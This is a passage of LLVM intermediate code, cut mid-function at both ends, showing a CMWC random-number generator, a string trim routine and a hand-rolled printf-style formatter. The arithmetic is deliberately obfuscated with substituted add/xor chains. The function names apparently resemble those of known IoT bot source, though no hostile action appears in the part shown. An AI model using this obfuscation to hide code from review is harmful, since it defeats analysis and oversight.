  %36 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %35
  %37 = load i32, i32* %36, align 4
  %38 = xor i32 %29, -1
  %39 = and i32 %37, %38
  %40 = xor i32 %37, -1
  %41 = and i32 %29, %40
  %42 = or i32 %39, %41
  %43 = xor i32 %29, %37
  %44 = xor i32 %42, -1
  %45 = and i32 -618978643, %44
  %46 = xor i32 -618978643, -1
  %47 = and i32 %42, %46
  %48 = xor i32 -1640531527, -1
  %49 = and i32 %48, -618978643
  %50 = and i32 -1640531527, %46
  %51 = or i32 %45, %47
  %52 = or i32 %49, %50
  %53 = xor i32 %51, %52
  %54 = xor i32 %42, -1640531527
  %55 = load i32, i32* %3, align 4
  %56 = xor i32 %53, -1
  %57 = and i32 %55, %56
  %58 = xor i32 %55, -1
  %59 = and i32 %53, %58
  %60 = or i32 %57, %59
  %61 = xor i32 %53, %55
  %62 = load i32, i32* %3, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %63
  store i32 %60, i32* %64, align 4
  br label %65

; <label>:65:                                     ; preds = %22
  %66 = load i32, i32* %3, align 4
  %67 = sub i32 0, %66
  %68 = sub i32 0, 1
  %69 = add i32 %67, %68
  %70 = sub i32 0, %69
  %71 = add nsw i32 %66, 1
  store i32 %70, i32* %3, align 4
  br label %19

; <label>:72:                                     ; preds = %19
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1320284150
  %7 = add i32 %6, 1
  %8 = sub i32 %7, 1320284150
  %9 = add i32 %5, 1
  %10 = xor i32 %8, -1
  %11 = xor i32 4095, -1
  %12 = xor i32 -478974455, -1
  %13 = or i32 %10, %11
  %14 = or i32 -478974455, %12
  %15 = xor i32 %13, -1
  %16 = and i32 %15, %14
  %17 = and i32 %8, 4095
  store i32 %16, i32* @rand_cmwc.i, align 4
  %18 = load i64, i64* %2, align 8
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  %22 = load i32, i32* %21, align 4
  %23 = zext i32 %22 to i64
  %24 = mul i64 %18, %23
  %25 = load i32, i32* @c, align 4
  %26 = zext i32 %25 to i64
  %27 = sub i64 0, %26
  %28 = sub i64 %24, %27
  %29 = add i64 %24, %26
  store i64 %28, i64* %1, align 8
  %30 = load i64, i64* %1, align 8
  %31 = lshr i64 %30, 32
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* @c, align 4
  %33 = load i64, i64* %1, align 8
  %34 = load i32, i32* @c, align 4
  %35 = zext i32 %34 to i64
  %36 = sub i64 0, %33
  %37 = sub i64 0, %35
  %38 = add i64 %36, %37
  %39 = sub i64 0, %38
  %40 = add i64 %33, %35
  %41 = trunc i64 %39 to i32
  store i32 %41, i32* %3, align 4
  %42 = load i32, i32* %3, align 4
  %43 = load i32, i32* @c, align 4
  %44 = icmp ult i32 %42, %43
  br i1 %44, label %45, label %56

; <label>:45:                                     ; preds = %0
  %46 = load i32, i32* %3, align 4
  %47 = sub i32 %46, -503287211
  %48 = add i32 %47, 1
  %49 = add i32 %48, -503287211
  %50 = add i32 %46, 1
  store i32 %49, i32* %3, align 4
  %51 = load i32, i32* @c, align 4
  %52 = add i32 %51, -1206320033
  %53 = add i32 %52, 1
  %54 = sub i32 %53, -1206320033
  %55 = add i32 %51, 1
  store i32 %54, i32* @c, align 4
  br label %56

; <label>:56:                                     ; preds = %45, %0
  %57 = load i32, i32* %4, align 4
  %58 = load i32, i32* %3, align 4
  %59 = sub i32 0, %58
  %60 = add i32 %57, %59
  %61 = sub i32 %57, %58
  %62 = load i32, i32* @rand_cmwc.i, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %63
  store i32 %60, i32* %64, align 4
  ret i32 %60
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, -2025043604137082045
  %9 = sub i64 %8, 1
  %10 = add i64 %9, -2025043604137082045
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #10
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %28

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = add i32 %23, -977115685
  %25 = add i32 %24, 1
  %26 = sub i32 %25, -977115685
  %27 = add nsw i32 %23, 1
  store i32 %26, i32* %4, align 4
  br label %13

; <label>:28:                                     ; preds = %13
  br label %29

; <label>:29:                                     ; preds = %44, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %42

; <label>:33:                                     ; preds = %29
  %34 = load i8*, i8** %2, align 8
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = call i32 @isspace(i32 %39) #10
  %41 = icmp ne i32 %40, 0
  br label %42

; <label>:42:                                     ; preds = %33, %29
  %43 = phi i1 [ false, %29 ], [ %41, %33 ]
  br i1 %43, label %44, label %50

; <label>:44:                                     ; preds = %42
  %45 = load i32, i32* %5, align 4
  %46 = sub i32 %45, -619202695
  %47 = add i32 %46, -1
  %48 = add i32 %47, -619202695
  %49 = add nsw i32 %45, -1
  store i32 %48, i32* %5, align 4
  br label %29

; <label>:50:                                     ; preds = %42
  %51 = load i32, i32* %4, align 4
  store i32 %51, i32* %3, align 4
  br label %52

; <label>:52:                                     ; preds = %71, %50
  %53 = load i32, i32* %3, align 4
  %54 = load i32, i32* %5, align 4
  %55 = icmp sle i32 %53, %54
  br i1 %55, label %56, label %78

; <label>:56:                                     ; preds = %52
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = load i8*, i8** %2, align 8
  %63 = load i32, i32* %3, align 4
  %64 = load i32, i32* %4, align 4
  %65 = sub i32 %63, -1414432446
  %66 = sub i32 %65, %64
  %67 = add i32 %66, -1414432446
  %68 = sub nsw i32 %63, %64
  %69 = sext i32 %67 to i64
  %70 = getelementptr inbounds i8, i8* %62, i64 %69
  store i8 %61, i8* %70, align 1
  br label %71

; <label>:71:                                     ; preds = %56
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 0, %72
  %74 = sub i32 0, 1
  %75 = add i32 %73, %74
  %76 = sub i32 0, %75
  %77 = add nsw i32 %72, 1
  store i32 %76, i32* %3, align 4
  br label %52

; <label>:78:                                     ; preds = %52
  %79 = load i8*, i8** %2, align 8
  %80 = load i32, i32* %3, align 4
  %81 = load i32, i32* %4, align 4
  %82 = sub i32 0, %81
  %83 = add i32 %80, %82
  %84 = sub nsw i32 %80, %81
  %85 = sext i32 %83 to i64
  %86 = getelementptr inbounds i8, i8* %79, i64 %85
  store i8 0, i8* %86, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %344, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %347

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %333

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %347

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %334

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %70

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = xor i32 %53, -1
  %55 = xor i32 2, -1
  %56 = xor i32 320081147, -1
  %57 = and i32 %54, 320081147
  %58 = and i32 %53, %56
  %59 = and i32 %55, 320081147
  %60 = and i32 2, %56
  %61 = or i32 %57, %58
  %62 = or i32 %59, %60
  %63 = xor i32 %61, %62
  %64 = or i32 %54, %55
  %65 = xor i32 %64, -1
  %66 = or i32 320081147, %56
  %67 = and i32 %65, %66
  %68 = or i32 %63, %67
  %69 = or i32 %53, 2
  store i32 %68, i32* %8, align 4
  br label %45

; <label>:70:                                     ; preds = %45
  br label %71

; <label>:71:                                     ; preds = %98, %70
  %72 = load i8*, i8** %5, align 8
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp sge i32 %74, 48
  br i1 %75, label %76, label %81

; <label>:76:                                     ; preds = %71
  %77 = load i8*, i8** %5, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 57
  br label %81

; <label>:81:                                     ; preds = %76, %71
  %82 = phi i1 [ false, %71 ], [ %80, %76 ]
  br i1 %82, label %83, label %101

; <label>:83:                                     ; preds = %81
  %84 = load i32, i32* %7, align 4
  %85 = mul nsw i32 %84, 10
  store i32 %85, i32* %7, align 4
  %86 = load i8*, i8** %5, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = sub i32 %88, 1472832059
  %90 = sub i32 %89, 48
  %91 = add i32 %90, 1472832059
  %92 = sub nsw i32 %88, 48
  %93 = load i32, i32* %7, align 4
  %94 = add i32 %93, 980869333
  %95 = add i32 %94, %91
  %96 = sub i32 %95, 980869333
  %97 = add nsw i32 %93, %91
  store i32 %96, i32* %7, align 4
  br label %98

; <label>:98:                                     ; preds = %83
  %99 = load i8*, i8** %5, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %5, align 8
  br label %71

; <label>:101:                                    ; preds = %81
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 115
  br i1 %105, label %106, label %146

; <label>:106:                                    ; preds = %101
  %107 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %108 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 8
  %110 = icmp ule i32 %109, 40
  br i1 %110, label %111, label %121

; <label>:111:                                    ; preds = %106
  %112 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 3
  %113 = load i8*, i8** %112, align 8
  %114 = getelementptr i8, i8* %113, i32 %109
  %115 = bitcast i8* %114 to i64*
  %116 = sub i32 0, %109
  %117 = sub i32 0, 8
  %118 = add i32 %116, %117
  %119 = sub i32 0, %118
  %120 = add i32 %109, 8
  store i32 %119, i32* %108, align 8
  br label %126

; <label>:121:                                    ; preds = %106
  %122 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 2
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to i64*
  %125 = getelementptr i8, i8* %123, i32 8
  store i8* %125, i8** %122, align 8
  br label %126

; <label>:126:                                    ; preds = %121, %111
  %127 = phi i64* [ %115, %111 ], [ %124, %121 ]
  %128 = load i64, i64* %127, align 8
  %129 = inttoptr i64 %128 to i8*
  store i8* %129, i8** %11, align 8
  %130 = load i8**, i8*** %4, align 8
  %131 = load i8*, i8** %11, align 8
  %132 = icmp ne i8* %131, null
  br i1 %132, label %133, label %135

; <label>:133:                                    ; preds = %126
  %134 = load i8*, i8** %11, align 8
  br label %136

; <label>:135:                                    ; preds = %126
  br label %136

; <label>:136:                                    ; preds = %135, %133
  %137 = phi i8* [ %134, %133 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.147, i32 0, i32 0), %135 ]
  %138 = load i32, i32* %7, align 4
  %139 = load i32, i32* %8, align 4
  %140 = call i32 @prints(i8** %130, i8* %137, i32 %138, i32 %139)
  %141 = load i32, i32* %9, align 4
  %142 = sub i32 %141, 1761434951
  %143 = add i32 %142, %140
  %144 = add i32 %143, 1761434951
  %145 = add nsw i32 %141, %140
  store i32 %144, i32* %9, align 4
  br label %344

; <label>:146:                                    ; preds = %101
  %147 = load i8*, i8** %5, align 8
  %148 = load i8, i8* %147, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 100
  br i1 %150, label %151, label %180

; <label>:151:                                    ; preds = %146
  %152 = load i8**, i8*** %4, align 8
  %153 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %154 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %153, i32 0, i32 0
  %155 = load i32, i32* %154, align 8
  %156 = icmp ule i32 %155, 40
  br i1 %156, label %157, label %165

; <label>:157:                                    ; preds = %151
  %158 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %153, i32 0, i32 3
  %159 = load i8*, i8** %158, align 8
  %160 = getelementptr i8, i8* %159, i32 %155
  %161 = bitcast i8* %160 to i32*
  %162 = sub i32 0, 8
  %163 = sub i32 %155, %162
  %164 = add i32 %155, 8
  store i32 %163, i32* %154, align 8
  br label %170

; <label>:165:                                    ; preds = %151
  %166 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %153, i32 0, i32 2
  %167 = load i8*, i8** %166, align 8
  %168 = bitcast i8* %167 to i32*
  %169 = getelementptr i8, i8* %167, i32 8
  store i8* %169, i8** %166, align 8
  br label %170

; <label>:170:                                    ; preds = %165, %157
  %171 = phi i32* [ %161, %157 ], [ %168, %165 ]
  %172 = load i32, i32* %171, align 4
  %173 = load i32, i32* %7, align 4
  %174 = load i32, i32* %8, align 4
  %175 = call i32 @printi(i8** %152, i32 %172, i32 10, i32 1, i32 %173, i32 %174, i32 97)
  %176 = load i32, i32* %9, align 4
  %177 = sub i32 0, %175
  %178 = sub i32 %176, %177
  %179 = add nsw i32 %176, %175
  store i32 %178, i32* %9, align 4
  br label %344

; <label>:180:                                    ; preds = %146
  %181 = load i8*, i8** %5, align 8
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 120
  br i1 %184, label %185, label %216

; <label>:185:                                    ; preds = %180
  %186 = load i8**, i8*** %4, align 8
  %187 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %188 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 8
  %190 = icmp ule i32 %189, 40
  br i1 %190, label %191, label %201

; <label>:191:                                    ; preds = %185
  %192 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %187, i32 0, i32 3
  %193 = load i8*, i8** %192, align 8
  %194 = getelementptr i8, i8* %193, i32 %189
  %195 = bitcast i8* %194 to i32*
  %196 = sub i32 0, %189
  %197 = sub i32 0, 8
  %198 = add i32 %196, %197
  %199 = sub i32 0, %198
  %200 = add i32 %189, 8
  store i32 %199, i32* %188, align 8
  br label %206

; <label>:201:                                    ; preds = %185
  %202 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %187, i32 0, i32 2
  %203 = load i8*, i8** %202, align 8
  %204 = bitcast i8* %203 to i32*
  %205 = getelementptr i8, i8* %203, i32 8
  store i8* %205, i8** %202, align 8
  br label %206

; <label>:206:                                    ; preds = %201, %191
  %207 = phi i32* [ %195, %191 ], [ %204, %201 ]
  %208 = load i32, i32* %207, align 4
  %209 = load i32, i32* %7, align 4
  %210 = load i32, i32* %8, align 4
  %211 = call i32 @printi(i8** %186, i32 %208, i32 16, i32 0, i32 %209, i32 %210, i32 97)
  %212 = load i32, i32* %9, align 4
  %213 = sub i32 0, %211
  %214 = sub i32 %212, %213
  %215 = add nsw i32 %212, %211
  store i32 %214, i32* %9, align 4
  br label %344

; <label>:216:                                    ; preds = %180
  %217 = load i8*, i8** %5, align 8
  %218 = load i8, i8* %217, align 1
  %219 = zext i8 %218 to i32
  %220 = icmp eq i32 %219, 88
  br i1 %220, label %221, label %253

; <label>:221:                                    ; preds = %216
  %222 = load i8**, i8*** %4, align 8
  %223 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %224 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %223, i32 0, i32 0
  %225 = load i32, i32* %224, align 8
  %226 = icmp ule i32 %225, 40
  br i1 %226, label %227, label %237

; <label>:227:                                    ; preds = %221
  %228 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %223, i32 0, i32 3
  %229 = load i8*, i8** %228, align 8
  %230 = getelementptr i8, i8* %229, i32 %225
  %231 = bitcast i8* %230 to i32*
  %232 = sub i32 0, %225
  %233 = sub i32 0, 8
  %234 = add i32 %232, %233
  %235 = sub i32 0, %234
  %236 = add i32 %225, 8
  store i32 %235, i32* %224, align 8
  br label %242

; <label>:237:                                    ; preds = %221
  %238 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %223, i32 0, i32 2
  %239 = load i8*, i8** %238, align 8
  %240 = bitcast i8* %239 to i32*
  %241 = getelementptr i8, i8* %239, i32 8
  store i8* %241, i8** %238, align 8
  br label %242

; <label>:242:                                    ; preds = %237, %227
  %243 = phi i32* [ %231, %227 ], [ %240, %237 ]
  %244 = load i32, i32* %243, align 4
  %245 = load i32, i32* %7, align 4
  %246 = load i32, i32* %8, align 4
  %247 = call i32 @printi(i8** %222, i32 %244, i32 16, i32 0, i32 %245, i32 %246, i32 65)
  %248 = load i32, i32* %9, align 4
  %249 = sub i32 %248, -504387461
  %250 = add i32 %249, %247
  %251 = add i32 %250, -504387461
  %252 = add nsw i32 %248, %247
  store i32 %251, i32* %9, align 4
  br label %344

; <label>:253:                                    ; preds = %216
  %254 = load i8*, i8** %5, align 8
  %255 = load i8, i8* %254, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 117
  br i1 %257, label %258, label %290

; <label>:258:                                    ; preds = %253
  %259 = load i8**, i8*** %4, align 8
  %260 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %261 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 0
  %262 = load i32, i32* %261, align 8
  %263 = icmp ule i32 %262, 40
  br i1 %263, label %264, label %274

; <label>:264:                                    ; preds = %258
  %265 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 3
  %266 = load i8*, i8** %265, align 8
  %267 = getelementptr i8, i8* %266, i32 %262
  %268 = bitcast i8* %267 to i32*
  %269 = sub i32 0, %262
  %270 = sub i32 0, 8
  %271 = add i32 %269, %270
  %272 = sub i32 0, %271
  %273 = add i32 %262, 8
  store i32 %272, i32* %261, align 8
  br label %279

; <label>:274:                                    ; preds = %258
  %275 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 2
  %276 = load i8*, i8** %275, align 8
  %277 = bitcast i8* %276 to i32*
  %278 = getelementptr i8, i8* %276, i32 8
  store i8* %278, i8** %275, align 8
  br label %279

; <label>:279:                                    ; preds = %274, %264
  %280 = phi i32* [ %268, %264 ], [ %277, %274 ]
  %281 = load i32, i32* %280, align 4
  %282 = load i32, i32* %7, align 4
  %283 = load i32, i32* %8, align 4
  %284 = call i32 @printi(i8** %259, i32 %281, i32 10, i32 0, i32 %282, i32 %283, i32 97)
  %285 = load i32, i32* %9, align 4
  %286 = add i32 %285, 1408619007
  %287 = add i32 %286, %284
  %288 = sub i32 %287, 1408619007
  %289 = add nsw i32 %285, %284
  store i32 %288, i32* %9, align 4
  br label %344

; <label>:290:                                    ; preds = %253
  %291 = load i8*, i8** %5, align 8
  %292 = load i8, i8* %291, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp eq i32 %293, 99
  br i1 %294, label %295, label %332

; <label>:295:                                    ; preds = %290
  %296 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %297 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %296, i32 0, i32 0
  %298 = load i32, i32* %297, align 8
  %299 = icmp ule i32 %298, 40
  br i1 %299, label %300, label %310

; <label>:300:                                    ; preds = %295
  %301 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %296, i32 0, i32 3
  %302 = load i8*, i8** %301, align 8
  %303 = getelementptr i8, i8* %302, i32 %298
  %304 = bitcast i8* %303 to i32*
  %305 = sub i32 0, %298
  %306 = sub i32 0, 8
  %307 = add i32 %305, %306
  %308 = sub i32 0, %307
  %309 = add i32 %298, 8
  store i32 %308, i32* %297, align 8
  br label %315

; <label>:310:                                    ; preds = %295
  %311 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %296, i32 0, i32 2
  %312 = load i8*, i8** %311, align 8
  %313 = bitcast i8* %312 to i32*
  %314 = getelementptr i8, i8* %312, i32 8
  store i8* %314, i8** %311, align 8
  br label %315

; <label>:315:                                    ; preds = %310, %300
  %316 = phi i32* [ %304, %300 ], [ %313, %310 ]
  %317 = load i32, i32* %316, align 4
  %318 = trunc i32 %317 to i8
  %319 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %318, i8* %319, align 1
  %320 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %320, align 1
  %321 = load i8**, i8*** %4, align 8
  %322 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %323 = load i32, i32* %7, align 4
  %324 = load i32, i32* %8, align 4
  %325 = call i32 @prints(i8** %321, i8* %322, i32 %323, i32 %324)
  %326 = load i32, i32* %9, align 4
  %327 = sub i32 0, %326
  %328 = sub i32 0, %325
  %329 = add i32 %327, %328
  %330 = sub i32 0, %329
  %331 = add nsw i32 %326, %325
  store i32 %330, i32* %9, align 4
  br label %344

; <label>:332:                                    ; preds = %290
  br label %343

; <label>:333:                                    ; preds = %17
  br label %334

; <label>:334:                                    ; preds = %333, %35
  %335 = load i8**, i8*** %4, align 8
  %336 = load i8*, i8** %5, align 8
  %337 = load i8, i8* %336, align 1
  %338 = zext i8 %337 to i32
  call void @printchar(i8** %335, i32 %338)
  %339 = load i32, i32* %9, align 4
  %340 = sub i32 0, 1
  %341 = sub i32 %339, %340
  %342 = add nsw i32 %339, 1
  store i32 %341, i32* %9, align 4
  br label %343

; <label>:343:                                    ; preds = %334, %332
  br label %344

; <label>:344:                                    ; preds = %343, %315, %279, %242, %206, %170, %136
  %345 = load i8*, i8** %5, align 8
  %346 = getelementptr inbounds i8, i8* %345, i32 1
  store i8* %346, i8** %5, align 8
  br label %12

; <label>:347:                                    ; preds = %29, %12
  %348 = load i8**, i8*** %4, align 8
  %349 = icmp ne i8** %348, null
  br i1 %349, label %350, label %353

; <label>:350:                                    ; preds = %347
  %351 = load i8**, i8*** %4, align 8
  %352 = load i8*, i8** %351, align 8
  store i8 0, i8* %352, align 1
  br label %353

; <label>:353:                                    ; preds = %350, %347
  %354 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %355 = bitcast %struct.__va_list_tag* %354 to i8*
  call void @llvm.va_end(i8* %355)
  %356 = load i32, i32* %9, align 4
  ret i32 %356
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %54

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add i32 %22, -117167259
  %24 = add i32 %23, 1
  %25 = sub i32 %24, -117167259
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %41

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub i32 0, %36
  %39 = add i32 %37, %38
  %40 = sub nsw i32 %37, %36
  store i32 %39, i32* %7, align 4
  br label %41

; <label>:41:                                     ; preds = %35, %34
  %42 = load i32, i32* %8, align 4
  %43 = xor i32 %42, -1
  %44 = xor i32 2, -1
  %45 = xor i32 2048769214, -1
  %46 = or i32 %43, %44
  %47 = or i32 2048769214, %45
  %48 = xor i32 %46, -1
  %49 = and i32 %48, %47
  %50 = and i32 %42, 2
  %51 = icmp ne i32 %49, 0
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %41
  store i32 48, i32* %10, align 4
  br label %53

; <label>:53:                                     ; preds = %52, %41
  br label %54

; <label>:54:                                     ; preds = %53, %4
  %55 = load i32, i32* %8, align 4
  %56 = xor i32 %55, -1
  %57 = xor i32 1, -1
  %58 = xor i32 1470831732, -1
  %59 = or i32 %56, %57
  %60 = or i32 1470831732, %58
  %61 = xor i32 %59, -1
  %62 = and i32 %61, %60
